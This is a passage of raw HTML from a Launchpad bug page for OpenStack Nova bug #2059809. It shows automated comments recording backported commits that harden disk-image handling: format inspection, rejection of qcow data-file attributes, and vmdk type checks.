Submitter: "Zuul (22348)"
Branch:    unmaintained/zed

commit e8f00617ed319aa37f6946cf10883eef6d180612
Author: Sean Mooney &lt;work@seanmooney.info&gt;
Date:   Thu Jul 4 20:09:31 2024 +0100

    Add iso file format inspector
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: I7e12718fb3e1f77eb8d1cfcb9fa64e8ddeb9e712
    (cherry picked from commit b1cc39848ebe9b9cb63141a647bda52a2842ee4b)
    (cherry picked from commit eeda7c333c773216c216159926673874ce4843ba)
    (cherry picked from commit 24628ecbbe9d5fdd4fe6767ca92395f0d3da9e48)
    (cherry picked from commit 65f0789df05e2ba7f11c0eaf2c6959367acbced2)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/419" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-30T17:37:14.880177+00:00" title="2024-07-30 17:37:14 UTC">on 2024-07-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/419"> #419</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924243">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924243</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/11613e7b3244958fa8d0b5253a185287d1ade2d8">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />11613e7b3244958<wbr />fa8d0b5253a1852<wbr />87d1ade2d8</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/zed</p>
<p>commit 11613e7b3244958<wbr />fa8d0b5253a1852<wbr />87d1ade2d8<br />
Author: Balazs Gibizer &lt;email address hidden&gt;<br />
Date:   Thu Jul 11 07:29:40 2024 +0200</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Stabilize iso format unit tests</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Some version of mkisofs does not properly handle if both the input and<br />
&nbsp;&nbsp;&nbsp;&nbsp;the output file of the command are the same. So this commit changes the<br />
&nbsp;&nbsp;&nbsp;&nbsp;unit tests depending on that binary to use a different files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I6924eb23ff5804<wbr />c22a48ec6fabcec<wbr />25f061906bb<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit c6d8c6972d52845<wbr />774b36acb84cd08<wbr />a4b2e4dcde)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a8783a767551df3<wbr />dd943bd862cdba3<wbr />5c51cdb7a6)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 02147b36d35e1e4<wbr />62e1405c36a2e67<wbr />a33de806de)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 47428f6caf503b9<wbr />4583dac614b5997<wbr />1f60a0ba9c)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924243
Committed: https://opendev.org/openstack/nova/commit/11613e7b3244958fa8d0b5253a185287d1ade2d8
Submitter: "Zuul (22348)"
Branch:    unmaintained/zed

commit 11613e7b3244958fa8d0b5253a185287d1ade2d8
Author: Balazs Gibizer &lt;gibi@redhat.com&gt;
Date:   Thu Jul 11 07:29:40 2024 +0200

    Stabilize iso format unit tests
    
    Some version of mkisofs does not properly handle if both the input and
    the output file of the command are the same. So this commit changes the
    unit tests depending on that binary to use a different files.
    
    Related-Bug: #2059809
    Change-Id: I6924eb23ff5804c22a48ec6fabcec25f061906bb
    (cherry picked from commit c6d8c6972d52845774b36acb84cd08a4b2e4dcde)
    (cherry picked from commit a8783a767551df3dd943bd862cdba35c51cdb7a6)
    (cherry picked from commit 02147b36d35e1e462e1405c36a2e67a33de806de)
    (cherry picked from commit 47428f6caf503b94583dac614b59971f60a0ba9c)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/420" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T13:26:49.822127+00:00" title="2024-08-02 13:26:49 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/420">
                <strong>Related fix proposed to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/420"> #420</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925592">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925592</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/nova/+/925592</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/421" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T13:27:07.398640+00:00" title="2024-08-02 13:27:07 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/421"> #421</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925594">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925594</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/nova/+/925594</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/422" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-13T10:52:57.336482+00:00" title="2024-08-13 10:52:57 UTC">on 2024-08-13</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/422">
                <strong>Fix merged to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/422"> #422</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924081">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924081</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/f844c8fe3ccbf5b477c007ac1d2e290c9d74f2e6">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />f844c8fe3ccbf5b<wbr />477c007ac1d2e29<wbr />0c9d74f2e6</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit f844c8fe3ccbf5b<wbr />477c007ac1d2e29<wbr />0c9d74f2e6<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Mon Apr 1 07:32:11 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Reject qcow files with data-file attributes</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ic3fa16f55acc38<wbr />cf6c1a4ac1dce44<wbr />87225e66d04<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit ec9c55cbbc91d1f<wbr />31e42ced289a7c8<wbr />2cf79dc2a2)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 58d933eafb3f716<wbr />4419000700a305c<wbr />8f75d5cb6e)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 736328f78fb88b6<wbr />d567b94b50cd14b<wbr />3ebef08a5e)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit af4d819c606d666<wbr />2d0b086365a51f5<wbr />220b596e48)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d69d441cf5d82f6<wbr />9d8ed7d555a6af7<wbr />3624866400)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924081
Committed: https://opendev.org/openstack/nova/commit/f844c8fe3ccbf5b477c007ac1d2e290c9d74f2e6
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit f844c8fe3ccbf5b477c007ac1d2e290c9d74f2e6
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Mon Apr 1 07:32:11 2024 -0700

    Reject qcow files with data-file attributes
    
    Change-Id: Ic3fa16f55acc38cf6c1a4ac1dce4487225e66d04
    Closes-Bug: #2059809
    (cherry picked from commit ec9c55cbbc91d1f31e42ced289a7c82cf79dc2a2)
    (cherry picked from commit 58d933eafb3f7164419000700a305c8f75d5cb6e)
    (cherry picked from commit 736328f78fb88b6d567b94b50cd14b3ebef08a5e)
    (cherry picked from commit af4d819c606d6662d0b086365a51f5220b596e48)
    (cherry picked from commit d69d441cf5d82f69d8ed7d555a6af73624866400)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-yoga
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/423" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-13T14:09:16.460058+00:00" title="2024-08-13 14:09:16 UTC">on 2024-08-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/423"> #423</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924082">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924082</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/b8a3d56f2e27531cc735606fbe92b648a51e8d62">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />b8a3d56f2e27531<wbr />cc735606fbe92b6<wbr />48a51e8d62</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit b8a3d56f2e27531<wbr />cc735606fbe92b6<wbr />48a51e8d62<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Apr 17 07:06:13 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Check images with format_inspector for safety</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;It has been asserted that we should not be calling qemu-img info<br />
&nbsp;&nbsp;&nbsp;&nbsp;on untrusted files. That means we need to know if they have a<br />
&nbsp;&nbsp;&nbsp;&nbsp;backing_file, data_file or other unsafe configuration *before* we use<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img to probe or convert them.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This grafts glance&#x27;s format_inspector module into nova/images so we<br />
&nbsp;&nbsp;&nbsp;&nbsp;can use it to check the file early for safety. The expectation is that<br />
&nbsp;&nbsp;&nbsp;&nbsp;this will be moved to oslo.utils (or something) later and thus we will<br />
&nbsp;&nbsp;&nbsp;&nbsp;just delete the file from nova and change our import when that happens.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;NOTE: This includes whitespace changes from the glance version of<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector.<wbr />py because of autopep8 demands.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Conflicts:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nova/<wbr />conf/workaround<wbr />s.py</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;NOTE(<wbr />elod.illes)<wbr />: conflict is due to the following patch that is only<br />
&nbsp;&nbsp;&nbsp;&nbsp;present in zed: Iab92124b5776a7<wbr />99c7f90d07281d2<wbr />8fcf191c8fe</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Iaefbe41b4c4bf0<wbr />cf95d8f621653fd<wbr />f65062aaa59<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 9cdce715945619f<wbr />c851ab3f43c97fa<wbr />b4bae4e35a)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit f07fa55fd86726e<wbr />eafcd4c0c687bc4<wbr />9dd4df9f4c)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 0acf5ee7b5dfb6f<wbr />f0f9a9745f5ad2a<wbr />0ed2bf65bf)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 67e5376dd64407f<wbr />5aaf1ea5f8c896e<wbr />356064a2c9)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit da352edceb74dbd<wbr />715268f94516503<wbr />042b48cc90)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924082
Committed: https://opendev.org/openstack/nova/commit/b8a3d56f2e27531cc735606fbe92b648a51e8d62
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit b8a3d56f2e27531cc735606fbe92b648a51e8d62
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Apr 17 07:06:13 2024 -0700

    Check images with format_inspector for safety
    
    It has been asserted that we should not be calling qemu-img info
    on untrusted files. That means we need to know if they have a
    backing_file, data_file or other unsafe configuration *before* we use
    qemu-img to probe or convert them.
    
    This grafts glance's format_inspector module into nova/images so we
    can use it to check the file early for safety. The expectation is that
    this will be moved to oslo.utils (or something) later and thus we will
    just delete the file from nova and change our import when that happens.
    
    NOTE: This includes whitespace changes from the glance version of
    format_inspector.py because of autopep8 demands.
    
    Conflicts:
      nova/conf/workarounds.py
    
    NOTE(elod.illes): conflict is due to the following patch that is only
    present in zed: Iab92124b5776a799c7f90d07281d28fcf191c8fe
    
    Change-Id: Iaefbe41b4c4bf0cf95d8f621653fdf65062aaa59
    Closes-Bug: #2059809
    (cherry picked from commit 9cdce715945619fc851ab3f43c97fab4bae4e35a)
    (cherry picked from commit f07fa55fd86726eeafcd4c0c687bc49dd4df9f4c)
    (cherry picked from commit 0acf5ee7b5dfb6ff0f9a9745f5ad2a0ed2bf65bf)
    (cherry picked from commit 67e5376dd64407f5aaf1ea5f8c896e356064a2c9)
    (cherry picked from commit da352edceb74dbd715268f94516503042b48cc90)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/424" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-14T17:54:50.502522+00:00" title="2024-08-14 17:54:50 UTC">on 2024-08-14</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/424">
                <strong>Related fix merged to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/424"> #424</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924084">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924084</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/3ba8ee16116e6a721413a382bbd4bcb68355cdf0">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />3ba8ee16116e6a7<wbr />21413a382bbd4bc<wbr />b68355cdf0</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit 3ba8ee16116e6a7<wbr />21413a382bbd4bc<wbr />b68355cdf0<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Mon Jul 1 09:06:40 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Fix vmdk_allowed_types checking</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This restores the vmdk_allowed_types checking in create_image()<br />
&nbsp;&nbsp;&nbsp;&nbsp;that was unintentionally lost by tightening the<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-<wbr />type-matches-<wbr />glance code in the fetch patch recently. Since we<br />
&nbsp;&nbsp;&nbsp;&nbsp;are still detecting the format of base images without metadata, we<br />
&nbsp;&nbsp;&nbsp;&nbsp;would have treated a vmdk file that claims to be raw as raw in fetch,<br />
&nbsp;&nbsp;&nbsp;&nbsp;but then read it like a vmdk once it was used as a base image for<br />
&nbsp;&nbsp;&nbsp;&nbsp;something else.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Conflicts:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nova/<wbr />tests/unit/<wbr />virt/libvirt/<wbr />test_utils.<wbr />py<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nova/<wbr />virt/libvirt/<wbr />utils.py</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;NOTE(<wbr />elod.illes)<wbr />: conflicts are due to patch to consolidate image<br />
&nbsp;&nbsp;&nbsp;&nbsp;creation functions (I111cfc8a5eae2<wbr />7b15c6312957255<wbr />fcf973038ddf) is only<br />
&nbsp;&nbsp;&nbsp;&nbsp;introduced in zed.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I07b332a7edb814<wbr />f6a91661651d9d2<wbr />4bfd6651ae7<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 08be7b2a0dc1d77<wbr />28d8034bc2aab04<wbr />28c4fb642e)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 11301e7e3f0d81a<wbr />3368632f90608e3<wbr />0d9c647111)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 70a435fd519a0eb<wbr />cc3ac9ad5254fef<wbr />bf19c93e48)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit f732f8476851e62<wbr />72d8ad9937f54b9<wbr />18795844e8)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a2acb31d790e6cb<wbr />41c067bfc0343bd<wbr />e274c9428c)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924084
Committed: https://opendev.org/openstack/nova/commit/3ba8ee16116e6a721413a382bbd4bcb68355cdf0
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit 3ba8ee16116e6a721413a382bbd4bcb68355cdf0
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Mon Jul 1 09:06:40 2024 -0700

    Fix vmdk_allowed_types checking
    
    This restores the vmdk_allowed_types checking in create_image()
    that was unintentionally lost by tightening the
    qemu-type-matches-glance code in the fetch patch recently. Since we
    are still detecting the format of base images without metadata, we
    would have treated a vmdk file that claims to be raw as raw in fetch,
    but then read it like a vmdk once it was used as a base image for
    something else.
    
    Conflicts:
      nova/tests/unit/virt/libvirt/test_utils.py
      nova/virt/libvirt/utils.py
    
    NOTE(elod.illes): conflicts are due to patch to consolidate image
    creation functions (I111cfc8a5eae27b15c6312957255fcf973038ddf) is only
    introduced in zed.
    
    Change-Id: I07b332a7edb814f6a91661651d9d24bfd6651ae7
    Related-Bug: #2059809
    (cherry picked from commit 08be7b2a0dc1d7728d8034bc2aab0428c4fb642e)
    (cherry picked from commit 11301e7e3f0d81a3368632f90608e30d9c647111)
    (cherry picked from commit 70a435fd519a0ebcc3ac9ad5254fefbf19c93e48)
    (cherry picked from commit f732f8476851e6272d8ad9937f54b918795844e8)
    (cherry picked from commit a2acb31d790e6cb41c067bfc0343bde274c9428c)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~james-page" class="sprite person">James Page (james-page)</a>
    
    <time title="2024-08-19 08:32:29 UTC" datetime="2024-08-19T08:32:29.540418+00:00">on 2024-08-19</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in cloud-archive: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Fix Committed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/425" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~james-page" class="sprite person">James Page (james-page)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-21T14:24:04.768978+00:00" title="2024-08-21 14:24:04 UTC">on 2024-08-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/425"> #425</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
